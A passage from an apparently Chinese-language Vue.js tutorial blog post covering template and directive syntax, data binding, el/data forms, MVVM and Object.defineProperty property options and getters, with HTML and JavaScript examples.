class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;url&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&#x27;http://www.baidu.com&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当使用<code>v-bind</code>时，右边的代码会当做表达式来执行，<code>url</code>就表示了读取<code>url</code>变量值，可以简写成<code>:</code></p>
<p>差值语法通常用来指定标签体内容</p>
<p><code>v-bind</code>通常用来指定标签属性内容</p>
<h3 id="1-3-2-小结：模板语法"><a href="#1-3-2-小结：模板语法" class="headerlink" title="1.3.2.小结：模板语法"></a>1.3.2.小结：模板语法</h3><ul>
<li><code>vue</code>模板语法有两大类<ul>
<li>差值语法<ul>
<li>功能：用于解析标签体内容</li>
<li>写法：<code>&#123;&#123;xxx&#125;&#125;</code><ul>
<li><code>xxx</code>是<code>js</code>表达式，且可以直接读取到<code>data</code>中的所有属性</li>
</ul>
</li>
</ul>
</li>
<li>指令语法<ul>
<li>功能：用于解析标签（包括：标签属性、标签体内容、绑定事件…）</li>
<li>举例：<code>v-bind:href=&quot;xxx&quot;</code>或简写成<code>:href=&quot;xxx&quot;</code>，<code>xxx</code>同样要写<code>js</code>表达式<ul>
<li>且可以直接读取到<code>data</code>中的所有属性</li>
<li>备注：<code>vue</code>中有很多的指令，且形式都是：<code>v-???</code>，此时我们只是拿<code>v-bind</code>举个例子</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-4-数据绑定"><a href="#1-4-数据绑定" class="headerlink" title="1.4.数据绑定"></a>1.4.数据绑定</h2><p><code>vue</code>中有2种数据绑定的方法</p>
<ul>
<li>单向数据绑定（<code>v-bind</code>）：数据只能从<code>data</code>流向页面</li>
<li>双向绑定（<code>v-bind</code>）：数据不仅能从<code>data</code>流向页面，还可以从页面流向<code>data</code><ul>
<li>双向绑定一般都应用在表单类元素（输入类元素）上，如<code>input</code>、<code>select</code></li>
<li><code>v-model:value</code>，可以简写成<code>v-model</code>，因为默认收集的就是<code>value</code></li>
</ul>
</li>
</ul>
<h2 id="1-5-el与data的两种写法"><a href="#1-5-el与data的两种写法" class="headerlink" title="1.5.el与data的两种写法"></a>1.5.<code>el</code>与<code>data</code>的两种写法</h2><p><code>vue</code>实例上，带<code>$</code>符号的属性都是给开发者用的，并且实例的原型对象上，也有一堆可以使用的方法</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511065626334.png" alt="image-20220511065626334"></p>
<h3 id="1-5-1-el的-mount写法"><a href="#1-5-1-el的-mount写法" class="headerlink" title="1.5.1.el的$mount写法"></a>1.5.1.<code>el</code>的<code>$mount</code>写法</h3><p>我们可以用原型对象上的<code>$mount</code>来指定容器</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    app.$mount(<span class="string">&#x27;#app&#x27;</span>) <span class="comment">// 指定容器</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(app)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511065934258.png" alt="image-20220511065934258"></p>
<h3 id="1-5-2-data的函数式写法"><a href="#1-5-2-data的函数式写法" class="headerlink" title="1.5.2.data的函数式写法"></a>1.5.2.<code>data</code>的函数式写法</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">// data的第二种写法</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;data中的this&#x27;</span>, <span class="variable language_">this</span>) <span class="comment">// data中的this指向，是vue实例对象</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    app.$mount(<span class="string">&#x27;#app&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511070401093.png" alt="image-20220511070401093"></p>
<p>注意如果<code>data</code>的函数的写法，不能写成箭头函数，否则<code>this</code>指向<code>window</code>，<code>Vue</code>实例是在<code>window</code>下的</p>
<p>箭头函数没有自己的<code>this</code>，会往外找</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// data的第二种写法</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;写成箭头函数式，data中的this&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511070615989.png" alt="image-20220511070615989"></p>
<p>普通函数的简写：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">app.$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-5-3-小结：el与data的两种写法"><a href="#1-5-3-小结：el与data的两种写法" class="headerlink" title="1.5.3.小结：el与data的两种写法"></a>1.5.3.小结：<code>el</code>与<code>data</code>的两种写法</h3><p><code>data</code>与<code>el</code>的两种写法</p>
<ul>
<li><code>el</code>有两种写法<ul>
<li><code>new Vue()</code>是写在配置对象的<code>el</code>属性中</li>
<li>拿到<code>Vue</code>实例，通过原型对象的<code>$mount</code>指定：<code>vm.$mount(&#39;#app&#39;)</code></li>
</ul>
</li>
<li><code>data</code>有两种写法<ul>
<li>对象式</li>
<li>函数式<ul>
<li>学习组件时，必须使用函数式，否则不同组件的<code>data</code>数据会共享</li>
<li>由<code>Vue</code>实例管理的函数，一定不要写成箭头函数，否则<code>this</code>就不再指向<code>Vue</code>实例了</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-6-理解MVVM"><a href="#1-6-理解MVVM" class="headerlink" title="1.6.理解MVVM"></a>1.6.理解<code>MVVM</code></h2><h3 id="1-6-1-MVVM"><a href="#1-6-1-MVVM" class="headerlink" title="1.6.1.MVVM"></a>1.6.1.<code>MVVM</code></h3><p><code>MVVM</code>并不是<code>vue</code>独有的，这是一种设计思想</p>
<ul>
<li><code>M</code>，模型<code>Model</code>：对应<code>data</code>中的数据</li>
<li><code>V</code>，视图<code>View</code>：模板</li>
<li><code>VM</code>，视图模型<code>ViewModel</code>：<code>Vue</code>实例对象</li>
</ul>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511071550941.png" alt="image-20220511071550941"></p>
<p>前端框架设计的主流思想就是</p>
<ul>
<li><p>准备好数据，写好模板代码，然后让框架开始工作，就可以让数据和模板建立起连接</p>
</li>
<li><p>并且框架会保证，数据不管怎么变，模板对应的页面都会自动更新</p>
</li>
</ul>
<h3 id="1-6-2-模板语法补充"><a href="#1-6-2-模板语法补充" class="headerlink" title="1.6.2.模板语法补充"></a>1.6.2.模板语法补充</h3><p>注意观察<code>vm</code>，写在<code>data</code>中的数据，最终是出现在了<code>vm</code>上</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511092337716.png" alt="image-20220511092337716"></p>
<p>这里<code>(...)</code>表示经过了数据代理，后面会讲到，鼠标点击即可查看具体内容</p>
<p>插值语法<code>&#123;&#123;xxx&#125;&#125;</code>还可以写什么呢？</p>
<ul>
<li><p>只要是<code>vm</code>身上有的属性，都可以写</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;$options&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;$emit&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;_c&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>所以插值语法的<code>xxx</code>并不是只可以写<code>data</code>里面的值，是<code>data</code>里的值最终到了<code>vm</code>实例对象上，只要是实例对象的属性，插值语法就都可以写</p>
</li>
</ul>
<h3 id="1-6-3-小结：MVVM"><a href="#1-6-3-小结：MVVM" class="headerlink" title="1.6.3.小结：MVVM"></a>1.6.3.小结：<code>MVVM</code></h3><p><code>MVVM</code>并不是<code>vue</code>独有的，这是一种设计思想</p>
<ul>
<li><code>M</code>，模型<code>Model</code>：对应<code>data</code>中的数据</li>
<li><code>V</code>，视图<code>View</code>：模板</li>
<li><code>VM</code>，视图模型<code>ViewModel</code>：<code>Vue</code>实例对象</li>
</ul>
<p>观察发现：</p>
<ul>
<li><code>data</code>中的所有属性，最后都出现在<code>vm</code>身上</li>
<li><code>vm</code>身上的所有属性，及<code>Vue</code>实例的原型对象上的所有属性，在<code>Vue</code>模板中都可以直接使用</li>
</ul>
<h2 id="1-7-数据代理"><a href="#1-7-数据代理" class="headerlink" title="1.7.数据代理"></a>1.7.数据代理</h2><h3 id="1-7-1-Object-defineProperty"><a href="#1-7-1-Object-defineProperty" class="headerlink" title="1.7.1.Object.defineProperty"></a>1.7.1.<code>Object.defineProperty</code></h3><p>功能：给对象添加属性用的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">value</span>: <span class="number">18</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p>此时<code>person</code>对象上，就有了<code>age</code>属性：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511093651529.png" alt="image-20220511093651529"></p>
<h4 id="可枚举配置项"><a href="#可枚举配置项" class="headerlink" title="可枚举配置项"></a>可枚举配置项</h4><p>那么为什么不直接添加<code>age</code>属性呢咧？</p>
<p>仔细看（用谷歌浏览器看，之前的都是用的<code>edge</code>李浏览器）：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511094735871.png" alt="image-20220511094735871"></p>
<p><code>age</code>的颜色，浏览器用另外一种颜色区分了，表示<code>age</code>属性是不参与遍历的（不可被枚举的）</p>
<p>使用<code>Object.keys</code>、<code>for</code>循环都是遍历不到的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">value</span>: <span class="number">18</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(person))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> person) &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;for:&#x27;</span>, key)</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511094244374.png" alt="image-20220511094244374"></p>
<p>定义时，可以使用配置项<code>enumerable</code>，控制其属性是否可以枚举，默认值是<code>false</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">value</span>: <span class="number">18</span>,</span><br><span class="line">	<span class="attr">enumerable</span>: <span class="literal">true</span> <span class="comment">// 设置新增的属性是可枚举的</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>重新打印输出下，<code>age</code>的颜色已经恢复正常，表示是可以枚举的了：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511094504645.png" alt="image-20220511094504645"></p>
<h4 id="可修改配置项"><a href="#可修改配置项" class="headerlink" title="可修改配置项"></a>可修改配置项</h4><p>但是我们修改<code>person.age = 19</code>后重新打印下<code>person</code>，发现<code>age</code>并没有变化</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511095028367.png" alt="image-20220511095028367"></p>
<p>使用配置项<code>writable</code>使新增的<code>age</code>属性可以修改：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">value</span>: <span class="number">18</span>,</span><br><span class="line">	<span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">writable</span>: <span class="literal">true</span> <span class="comment">// 控制属性是否可以被修改，其默认值是false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p><code>age</code>的值已经可以修改了：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511095219920.png" alt="image-20220511095219920"></p>
<h4 id="可删除配置项"><a href="#可删除配置项" class="headerlink" title="可删除配置项"></a>可删除配置项</h4><p>我们删除下<code>age</code>属性，发现删除不了：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511095425289.png" alt="image-20220511095425289"></p>
<p>使用配置项<code>configurable</code>使新增的<code>age</code>属性可以删除：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">value</span>: <span class="number">18</span>,</span><br><span class="line">	<span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">          <span class="attr">configurable</span>: <span class="literal">true</span> <span class="comment">// 控制属性是否可以被删除，其默认值是false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>现在就可以删除<code>age</code>属性了</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511095617387.png" alt="image-20220511095617387"></p>
<p>所以，使用<code>Object.defineProperty</code>可以对追加的属性，进行更多高级的限制</p>
<h4 id="新场景需求"><a href="#新场景需求" class="headerlink" title="新场景需求"></a>新场景需求</h4><p>假设<code>age</code>依赖于<code>num</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">18</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">	<span class="attr">age</span>: num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p>后期<code>num</code>变化的时候，我们希望<code>person</code>也跟着改变</p>
<p>但目前是没有的</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511100438806.png" alt="image-20220511100438806"></p>
<p>因为代码执行过一遍之后，是不会再重新执行的</p>
<p>除非你这样手动再赋值一下：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511100612905.png" alt="image-20220511100612905"></p>
<p>但我们希望这一过程是<code>自动</code>的，引入下一小节</p>
<h4 id="get-配置项"><a href="#get-配置项" class="headerlink" title="get()配置项"></a><code>get()</code>配置项</h4><p>当有人读取<code>person</code>的<code>age</code>属性时，<code>get</code>函数<code>(getter)</code>就会被调用，且返回值就是<code>age</code>的值</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">19</span></span><br><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">	<span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">	<span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(person, <span class="string">&#x27;age&#x27;</span>, &#123;</span><br><span class="line">	<span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person)</span><br></pre></td></tr></table></figure>

<p><code>person</code>对象：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511101719045.png" alt="image-20220511101719045"></p>
<p>此时<code>person</code>对象上有<code>age</code>属性了，还有一个为<code>age</code>属性服务的<code>getter</code>函数</p>
<p>当鼠标悬浮在<code>(...)</code>上时，提示<code>invoke property getter</code>，中文翻译表示<code>调用属性 gettter</code>，意思就是说<code>age</code>的值，调用了<code>getter</code>这个属性</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511101913655.png" alt="image-20220511101913655"></p>
<p>要想看<code>age</code>的值，必须用鼠标点一下<code>(...)</code>，当我们点这么一下的时候，会触发<code>getter</code>函数的调用</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220511102035690.png" alt="image-20220511102035690"></p>
<p>此时我们可以完善一下，上一小节的需求，这里<code>return</code>的就是<code>num</code>变量：</p>
